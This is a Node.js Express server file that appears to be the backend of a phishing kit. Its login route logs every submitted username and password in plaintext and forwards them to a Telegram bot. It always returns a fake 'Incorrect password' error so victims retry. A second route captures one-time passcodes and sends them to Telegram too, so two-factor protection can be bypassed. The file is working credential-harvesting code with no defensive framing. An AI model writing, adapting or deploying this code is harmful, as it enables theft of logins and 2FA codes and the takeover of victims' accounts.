import express from 'express';
import cors from 'cors';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Low } from 'lowdb';
import { JSONFile } from 'lowdb/node';

// Load env
dotenv.config();

// Express setup
const app = express();
app.use(cors());
app.use(express.json());

// 📍 Setup __dirname in ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 📁 Ensure db.json exists with default structure
const filePath = path.join(__dirname, 'db.json');
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, JSON.stringify({ logins: [] }, null, 2));
}

// 📦 Setup lowdb with default data
const adapter = new JSONFile(filePath);
const defaultData = { logins: [] };
const db = new Low(adapter, defaultData);

// Read the database
await db.read();

// If db.data is null, set it to default data
db.data ||= defaultData;

// Write to ensure the database is initialized
await db.write();

// 🔐 Env vars
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// 📱 Helper function to send Telegram message safely
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram not configured. Message would be:', message);
    return;
  }

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    console.log('✅ Telegram message sent');
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data || error.message);
  }
}

// 🟢 Login route
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    console.log('📧 Login attempt:', { username, password });

    // Save to database first
    db.data.logins.push({
      username,
      password,
      timestamp: new Date().toISOString(),
      type: 'login'
    });
    await db.write();

    // Send to Telegram (won't crash if it fails)
    await sendTelegramMessage(`🔐 Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`);

    // ⚠️ HARDCODED: Always return incorrect password error
    // This will trigger the error display on your frontend
    return res.status(401).json({ error: 'Incorrect password' });

    // Note: The code below is unreachable but shows what would happen in normal flow
    // res.json({ message: 'Login successful' });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// 🟢 OTP route
app.post('/api/otp', async (req, res) => {
  try {
    const { otp } = req.body;
    
    console.log('🔢 OTP attempt:', { otp });

    // Find the most recent login attempt
    const lastLogin = db.data.logins.at(-1);

    if (!lastLogin) {
      return res.status(400).json({ error: 'No login found before OTP submission' });
    }

    // Update the last login with OTP
    lastLogin.otp = otp;
    lastLogin.otpTimestamp = new Date().toISOString();
    await db.write();

    // Send to Telegram (won't crash if it fails)
    await sendTelegramMessage(`🔢 OTP Code:\nCode: ${otp}\nFor user: ${lastLogin.username}\nTime: ${new Date().toLocaleString()}`);

    res.json({ message: 'OTP recorded successfully' });
    
  } catch (error) {
    console.error('OTP error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// 🟢 Health check route
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    telegram: TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'configured' : 'not configured',
    database: 'connected'
  });
});

// 🟢 Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? '✅' : '❌'}`);
  console.log(`📊 Database file: ${filePath}`);
});
 